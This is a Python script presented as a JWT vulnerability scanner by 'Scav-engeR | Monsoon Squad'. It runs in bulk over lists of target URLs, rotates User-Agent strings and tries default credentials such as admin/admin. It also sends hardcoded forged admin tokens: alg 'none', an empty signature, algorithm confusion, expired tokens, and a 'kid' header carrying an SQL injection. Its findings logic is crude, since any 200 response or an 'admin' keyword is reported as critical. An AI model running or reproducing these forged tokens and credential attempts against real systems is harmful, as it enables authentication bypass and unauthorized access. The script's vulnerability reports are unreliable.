#!/usr/bin/env python3
"""
JWT Authentication Vulnerability Scanner
Detects common JWT token vulnerabilities in web applications
By: Scav-engeR
"""
import asyncio
import json
import base64
import random
import re
import sys
import time
from typing import Dict, List, Set, Tuple
import httpx
import argparse
from urllib.parse import urlparse, urljoin
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.panel import Panel
from rich import box
from datetime import datetime, timedelta

console = Console()

# JWT attack vectors
JWT_ATTACKS = {
    "none_algorithm": {
        "description": "Algorithm 'none' vulnerability",
        "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJoYWNrZXIiLCJpYXQiOjE2NzY2NzQwNjEsImV4cCI6MTcwODIxMDA2MSwiYXVkIjoid3d3LnZpY3RpbS5jb20iLCJzdWIiOiJoYWNrZXJAd3d3LmhhY2tlci5jb20iLCJyb2xlIjoiYWRtaW4ifQ."
    },
    "empty_signature": {
        "description": "Empty signature vulnerability",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJoYWNrZXIiLCJpYXQiOjE2NzY2NzQwNjEsImV4cCI6MTcwODIxMDA2MSwiYXVkIjoid3d3LnZpY3RpbS5jb20iLCJzdWIiOiJoYWNrZXJAd3d3LmhhY2tlci5jb20iLCJyb2xlIjoiYWRtaW4ifQ."
    },
    "algorithm_confusion": {
        "description": "Algorithm confusion (RS256 to HS256)",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJoYWNrZXIiLCJpYXQiOjE2NzY2NzQwNjEsImV4cCI6MTcwODIxMDA2MSwiYXVkIjoid3d3LnZpY3RpbS5jb20iLCJzdWIiOiJoYWNrZXJAd3d3LmhhY2tlci5jb20iLCJyb2xlIjoiYWRtaW4ifQ.2D9R9G-CEJTw_StM0s1fbXsR4DIB5IW_0T7uOqEzFrw"
    },
    "kid_injection": {
        "description": "Key ID (kid) SQL injection",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgMT0xIC0tIn0.eyJpc3MiOiJoYWNrZXIiLCJpYXQiOjE2NzY2NzQwNjEsImV4cCI6MTcwODIxMDA2MSwiYXVkIjoid3d3LnZpY3RpbS5jb20iLCJzdWIiOiJoYWNrZXJAd3d3LmhhY2tlci5jb20iLCJyb2xlIjoiYWRtaW4ifQ.757L7rv9CjD5c963zZwIhCOCdnKFhQ008_RIMXJ6MH8"
    },
    "jwt_expiration": {
        "description": "Expired token acceptance",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJoYWNrZXIiLCJpYXQiOjEwMDAwMDAwMCwiZXhwIjoxMDAwMDAwMTAsImF1ZCI6Ind3dy52aWN0aW0uY29tIiwic3ViIjoiaGFja2VyQHd3dy5oYWNrZXIuY29tIiwicm9sZSI6ImFkbWluIn0.S-L5LXE10_td9DocBrjP8bqPQAx6JrP9PRd7Ct-NiJU"
    }
}

# Common headers where JWTs might be found
JWT_HEADER_LOCATIONS = [
    "Authorization",
    "X-API-Key",
    "Token",
    "JWT",
    "X-Access-Token",
    "Bearer"
]

# Common cookies where JWTs might be found
JWT_COOKIE_NAMES = [
    "jwt",
    "token",
    "access_token",
    "id_token",
    "auth",
    "session"
]

# Common JWT endpoints
JWT_ENDPOINTS = [
    "/api/login",
    "/api/token",
    "/api/auth",
    "/oauth/token",
    "/auth",
    "/login",
    "/token",
    "/jwt",
    "/api/v1/auth",
    "/api/v1/token",
    "/api/v2/auth",
    "/connect/token"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

class JWTScanner:
    def __init__(self, timeout: int = 10, concurrency: int = 10):
        self.timeout = timeout
        self.concurrency = concurrency
        self.jwt_endpoints = set()
        self.vulnerabilities = []
        
    def get_headers(self) -> Dict[str, str]:
        """Generate request headers with randomized User-Agent"""
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
        }
        return headers
    
    def decode_jwt_payload(self, token: str) -> Dict:
        """Decode the payload of a JWT token without verification"""
        try:
            # Split the token
            parts = token.split('.')
            if len(parts) < 2:
                return {}
            
            # Decode the payload (middle part)
            payload_bytes = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4))
            payload = json.loads(payload_bytes.decode('utf-8'))
            return payload
        except Exception:
            return {}
    
    def is_jwt_token(self, token: str) -> bool:
        """Check if a string looks like a JWT token"""
        if not token:
            return False
            
        # JWT tokens typically have 3 parts separated by dots
        parts = token.split(".")
        if len(parts) not in [2, 3]:  # Allow for JWTs with 2 or 3 parts
            return False
            
        # First part should be decodable header
        try:
            header_bytes = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4))
            header = json.loads(header_bytes.decode('utf-8'))
            
            # Check for typical JWT header fields
            if "typ" not in header or "alg" not in header:
                return False
                
            return True
        except Exception:
            return False
    
    def extract_tokens_from_response(self, response) -> List[Tuple[str, str]]:
        """Extract potential JWT tokens from a response"""
        tokens = []
        
        # Check response headers
        for header_name, header_value in response.headers.items():
            for jwt_header in JWT_HEADER_LOCATIONS:
                if jwt_header.lower() in header_name.lower() and header_value:
                    # Extract token from Authorization: Bearer type headers
                    if "bearer" in header_name.lower() and header_value.lower().startswith("bearer "):
                        token = header_value[7:]  # Remove "Bearer " prefix
                    else:
                        token = header_value
                        
                    if self.is_jwt_token(token):
                        tokens.append((header_name, token))
        
        # Check cookies
        for cookie_name, cookie_value in response.cookies.items():
            if any(jwt_name.lower() in cookie_name.lower() for jwt_name in JWT_COOKIE_NAMES):
                if self.is_jwt_token(cookie_value):
                    tokens.append((f"Cookie: {cookie_name}", cookie_value))
        
        # Check response body for tokens
        if response.headers.get("Content-Type", "").lower().startswith("application/json"):
            try:
                body = response.json()
                
                # Function to recursively search JSON for tokens
                def search_json(obj, path=""):
                    if isinstance(obj, dict):
                        for k, v in obj.items():
                            if isinstance(v, str) and self.is_jwt_token(v):
                                tokens.append((f"Body: {path}.{k}" if path else f"Body: {k}", v))
                            elif isinstance(v, (dict, list)):
                                search_json(v, f"{path}.{k}" if path else k)
                    elif isinstance(obj, list):
                        for i, item in enumerate(obj):
                            if isinstance(item, str) and self.is_jwt_token(item):
                                tokens.append((f"Body: {path}[{i}]", item))
                            elif isinstance(item, (dict, list)):
                                search_json(item, f"{path}[{i}]")
                
                search_json(body)
            except Exception:
                pass
        
        return tokens
    
    async def discover_endpoints(self, target_url: str) -> Dict:
        """Identify JWT authentication endpoints"""
        result = {
            "url": target_url,
            "jwt_endpoints": [],
            "tokens_found": []
        }
        
        try:
            # Normalize URL
            if not target_url.startswith(('http://', 'https://')):
                target_url = f'https://{target_url}'
                
            parsed_url = urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
                # First, check the base URL
                try:
                    response = await client.get(base_url, headers=self.get_headers())
                    tokens = self.extract_tokens_from_response(response)
                    for location, token in tokens:
                        result["tokens_found"].append({
                            "location": location,
                            "token": token,
                            "decoded": self.decode_jwt_payload(token)
                        })
                except Exception:
                    pass
                
                # Then, check common JWT endpoints
                for endpoint in JWT_ENDPOINTS:
                    try:
                        # GET request
                        test_url = urljoin(base_url, endpoint)
                        response = await client.get(test_url, headers=self.get_headers())
                        
                        # If a login endpoint returns 200 OK without credentials, something's wrong
                        if response.status_code == 200 and "login" in endpoint.lower():
                            self.vulnerabilities.append({
                                "url": test_url,
                                "vulnerability": "Login Endpoint Without Authentication",
                                "severity": "Critical",
                                "description": "Login endpoint returns 200 without credentials",
                                "evidence": f"Status code: {response.status_code}"
                            })
                        
                        # Check for JWT tokens in response
                        tokens = self.extract_tokens_from_response(response)
                        if tokens:
                            result["jwt_endpoints"].append({
                                "url": test_url,
                                "method": "GET",
                                "status": response.status_code
                            })
                            self.jwt_endpoints.add(test_url)
                            for location, token in tokens:
                                result["tokens_found"].append({
                                    "location": location,
                                    "token": token,
                                    "decoded": self.decode_jwt_payload(token)
                                })
                        
                        # POST request with empty body
                        response = await client.post(
                            test_url, 
                            json={},
                            headers=self.get_headers()
                        )
                        
                        # Check for JWT tokens in response
                        tokens = self.extract_tokens_from_response(response)
                        if tokens:
                            result["jwt_endpoints"].append({
                                "url": test_url,
                                "method": "POST",
                                "status": response.status_code
                            })
                            self.jwt_endpoints.add(test_url)
                            for location, token in tokens:
                                result["tokens_found"].append({
                                    "location": location,
                                    "token": token,
                                    "decoded": self.decode_jwt_payload(token)
                                })
                        
                        # Try basic login credentials
                        basic_creds = [
                            {"username": "admin", "password": "admin"},
                            {"username": "test", "password": "test"},
                            {"email": "admin@example.com", "password": "admin"},
                            {"email": "test@example.com", "password": "test"},
                            {"user": "admin", "pass": "admin"}
                        ]
                        
                        for creds in basic_creds:
                            response = await client.post(
                                test_url,
                                json=creds,
                                headers=self.get_headers()
                            )
                            
                            # Check if we got a successful login with basic credentials
                            if response.status_code in [200, 201, 202, 203]:
                                self.vulnerabilities.append({
                                    "url": test_url,
                                    "vulnerability": "Weak Default Credentials",
                                    "severity": "Critical",
                                    "description": f"Successful login with {json.dumps(creds)}",
                                    "evidence": f"Status code: {response.status_code}"
                                })
                            
                            # Check for JWT tokens in response
                            tokens = self.extract_tokens_from_response(response)
                            if tokens:
                                result["jwt_endpoints"].append({
                                    "url": test_url,
                                    "method": "POST",
                                    "status": response.status_code,
                                    "credentials": creds
                                })
                                self.jwt_endpoints.add(test_url)
                                for location, token in tokens:
                                    result["tokens_found"].append({
                                        "location": location,
                                        "token": token,
                                        "decoded": self.decode_jwt_payload(token)
                                    })
                                
                                # If we got a token, let's test it on the base URL
                                if tokens:
                                    jwt_token = tokens[0][1]  # Get the first token
                                    auth_headers = self.get_headers()
                                    auth_headers["Authorization"] = f"Bearer {jwt_token}"
                                    
                                    # Test the token on the base URL
                                    try:
                                        auth_response = await client.get(base_url, headers=auth_headers)
                                        
                                        # Check if the response is different with the token
                                        if auth_response.status_code != response.status_code:
                                            # This endpoint returns a working token
                                            result["working_token"] = {
                                                "endpoint": test_url,
                                                "token": jwt_token,
                                                "decoded": self.decode_jwt_payload(jwt_token)
                                            }
                                    except Exception:
                                        pass
                    except Exception:
                        continue
            
            return result
        
        except Exception as e:
            console.print(f"[red]Error discovering endpoints for {target_url}: {str(e)}")
            return result
    
    async def test_jwt_vulnerabilities(self, endpoint: str) -> None:
        """Test an endpoint for JWT vulnerabilities"""
        try:
            parsed_url = urlparse(endpoint)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
                # First try to get a valid token for reference
                valid_token = None
                token_location = None
                
                # Try basic login with common credentials
                basic_creds = [
                    {"username": "admin", "password": "admin"},
                    {"username": "test", "password": "test"},
                    {"email": "admin@example.com", "password": "admin"},
                    {"email": "test@example.com", "password": "test"},
                    {"user": "admin", "pass": "admin"}
                ]
                
                for creds in basic_creds:
                    try:
                        response = await client.post(endpoint, json=creds, headers=self.get_headers())
                        tokens = self.extract_tokens_from_response(response)
                        if tokens:
                            valid_token = tokens[0][1]  # Get first token value
                            token_location = tokens[0][0]  # Get location (header name or cookie)
                            break
                    except Exception:
                        continue
                
                # If we couldn't get a token through login, try other endpoints
                if not valid_token:
                    try:
                        response = await client.get(endpoint, headers=self.get_headers())
                        tokens = self.extract_tokens_from_response(response)
                        if tokens:
                            valid_token = tokens[0][1]
                            token_location = tokens[0][0]
                    except Exception:
                        pass
                
                # Now test vulnerable tokens
                for attack_name, attack_data in JWT_ATTACKS.items():
                    malicious_token = attack_data["token"]
                    
                    # Create headers with the malicious token
                    attack_headers = self.get_headers()
                    
                    # If we know where the token is located, use that location
                    if token_location:
                        if token_location.startswith("Cookie:"):
                            cookie_name = token_location.split(":")[1].strip()
                            attack_headers["Cookie"] = f"{cookie_name}={malicious_token}"
                        elif token_location.startswith("Body:"):
                            # Skip body tokens for now as they need special handling
                            continue
                        else:
                            if token_location.lower() == "authorization":
                                attack_headers[token_location] = f"Bearer {malicious_token}"
                            else:
                                attack_headers[token_location] = malicious_token
                    else:
                        # Try the common locations
                        attack_headers["Authorization"] = f"Bearer {malicious_token}"
                    
                    try:
                        # Try GET request to base URL with the malicious token
                        response = await client.get(base_url, headers=attack_headers)
                        
                        # If we get a 2XX status code, the attack might have worked
                        if 200 <= response.status_code < 300:
                            # Try to identify what kind of resource we got back
                            content_type = response.headers.get("Content-Type", "")
                            
                            if "application/json" in content_type:
                                try:
                                    response_data = response.json()
                                    # Look for successful data patterns
                                    if isinstance(response_data, dict) and any(key in str(response_data).lower() for key in ["user", "profile", "account", "data"]):
                                        # This might indicate successful access
                                        self.vulnerabilities.append({
                                            "url": endpoint,
                                            "vulnerability": f"JWT {attack_data['description']}",
                                            "severity": "Critical",
                                            "description": f"Endpoint accepted forged JWT with {attack_name}",
                                            "evidence": f"Status code: {response.status_code}, Response contains user data",
                                            "token": malicious_token
                                        })
                                except Exception:
                                    pass
                            
                            # If we get HTML back, check for admin panels or protected areas
                            elif "text/html" in content_type:
                                if any(term in response.text.lower() for term in ["admin", "dashboard", "profile", "account", "settings"]):
                                    self.vulnerabilities.append({
                                        "url": endpoint,
                                        "vulnerability": f"JWT {attack_data['description']}",
                                        "severity": "Critical",
                                        "description": f"Endpoint accepted forged JWT with {attack_name}",
                                        "evidence": f"Status code: {response.status_code}, Response contains protected UI",
                                        "token": malicious_token
                                    })
                    
                    except Exception:
                        continue
        
        except Exception as e:
            console.print(f"[red]Error testing JWT vulnerabilities for {endpoint}: {str(e)}")
    
    async def scan_targets(self, targets: List[str]) -> List[Dict]:
        """Scan a list of target URLs for JWT vulnerabilities"""
        results = []
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Discovering JWT endpoints...", total=len(targets))
            
            # First, identify JWT endpoints
            batch_size = min(self.concurrency, len(targets))
            for i in range(0, len(targets), batch_size):
                batch = targets[i:i+batch_size]
                batch_tasks = [self.discover_endpoints(target) for target in batch]
                batch_results = await asyncio.gather(*batch_tasks)
                results.extend(batch_results)
                progress.update(task, advance=len(batch))
        
        # Collect all JWT endpoints
        jwt_endpoints = set()
        for result in results:
            for endpoint in result.get("jwt_endpoints", []):
                jwt_endpoints.add(endpoint["url"])
        
        # Now test each JWT endpoint for vulnerabilities
        console.print(f"[green]Found {len(jwt_endpoints)} JWT endpoints to test")
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Testing JWT vulnerabilities...", total=len(jwt_endpoints))
            
            batch_size = min(self.concurrency, len(jwt_endpoints))
            for i in range(0, len(jwt_endpoints), batch_size):
                batch = list(jwt_endpoints)[i:i+batch_size]
                batch_tasks = [self.test_jwt_vulnerabilities(endpoint) for endpoint in batch]
                await asyncio.gather(*batch_tasks)
                progress.update(task, advance=len(batch))
        
        return results
    
    def print_results(self, scan_results):
        """Print a summary of the scan results"""
        console.print(Panel.fit("[bold cyan]JWT Security Scan Results", border_style="cyan"))
        
        # Print JWT endpoints found
        console.print(f"\n[bold green]Found {len(self.jwt_endpoints)} JWT endpoints")
        
        if self.jwt_endpoints:
            endpoints_table = Table(title="JWT Authentication Endpoints", box=box.ROUNDED)
            endpoints_table.add_column("Endpoint", style="cyan")
            
            for endpoint in self.jwt_endpoints:
                endpoints_table.add_row(endpoint)
            
            console.print(endpoints_table)
        
        # Print JSON Web Tokens found
        jwt_tokens = {}
        for result in scan_results:
            for token_info in result.get("tokens_found", []):
                token = token_info["token"]
                if token not in jwt_tokens:
                    jwt_tokens[token] = token_info
        
        console.print(f"\n[bold green]Found {len(jwt_tokens)} unique JWT tokens")
        
        if jwt_tokens:
            tokens_table = Table(title="JWT Tokens", box=box.ROUNDED)
            tokens_table.add_column("Location", style="cyan")
            tokens_table.add_column("Token (Truncated)", style="green")
            tokens_table.add_column("Payload", style="yellow")
            
            for token_info in jwt_tokens.values():
                token_display = token_info["token"][:20] + "..." if len(token_info["token"]) > 20 else token_info["token"]
                
                # Format the payload nicely
                payload = token_info.get("decoded", {})
                payload_str = json.dumps(payload, indent=2)
                if len(payload_str) > 50:
                    payload_str = payload_str[:47] + "..."
                
                tokens_table.add_row(
                    token_info["location"],
                    token_display,
                    payload_str
                )
            
            console.print(tokens_table)
        
        # Print vulnerabilities found
        console.print(f"\n[bold red]Found {len(self.vulnerabilities)} JWT vulnerabilities")
        
        if self.vulnerabilities:
            vuln_table = Table(title="JWT Vulnerabilities", box=box.ROUNDED)
            vuln_table.add_column("URL", style="cyan", no_wrap=True)
            vuln_table.add_column("Vulnerability", style="red")
            vuln_table.add_column("Severity", style="yellow")
            vuln_table.add_column("Description", style="green")
            
            for vuln in self.vulnerabilities:
                url = vuln["url"]
                if len(url) > 50:
                    url = url[:47] + "..."
                    
                vuln_table.add_row(
                    url,
                    vuln["vulnerability"],
                    vuln["severity"],
                    vuln["description"]
                )
            
            console.print(vuln_table)
    
    def save_results(self, filepath: str):
        """Save scan results to a JSON file"""
        output = {
            "scan_date": str(datetime.now()),
            "jwt_endpoints": list(self.jwt_endpoints),
            "vulnerabilities": self.vulnerabilities
        }
        
        try:
            with open(filepath, 'w') as f:
                json.dump(output, f, indent=2)
            console.print(f"[green]Results saved to {filepath}")
        except Exception as e:
            console.print(f"[red]Error saving results: {e}")


async def main():
    parser = argparse.ArgumentParser(description="JWT Authentication Vulnerability Scanner")
    parser.add_argument("--input", "-i", help="Input file with URLs to scan (one per line)")
    parser.add_argument("--url", "-u", help="Single URL to scan")
    parser.add_argument("--output", "-o", default="jwt_scan_results.json", help="Output file for scan results")
    parser.add_argument("--timeout", "-t", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--concurrency", "-c", type=int, default=5, help="Number of concurrent requests")
    args = parser.parse_args()
    
    targets = []
    
    if args.input:
        try:
            with open(args.input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            console.print(f"[red]Error reading input file: {e}")
            return
    elif args.url:
        targets = [args.url]
    else:
        console.print("[red]Error: No targets specified. Use --input or --url")
        return
    
    console.print(Panel.fit(f"[bold cyan]JWT Authentication Scanner\n[green]Targets: {len(targets)}\n[neon_pink]By: Scav-engeR | Monsoon Squad", border_style="cyan"))
    
    scanner = JWTScanner(timeout=args.timeout, concurrency=args.concurrency)
    results = await scanner.scan_targets(targets)
    scanner.print_results(results)
    scanner.save_results(args.output)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("[red]Scan terminated by user")
    except Exception as e:
        console.print(f"[red]Critical error: {e}")
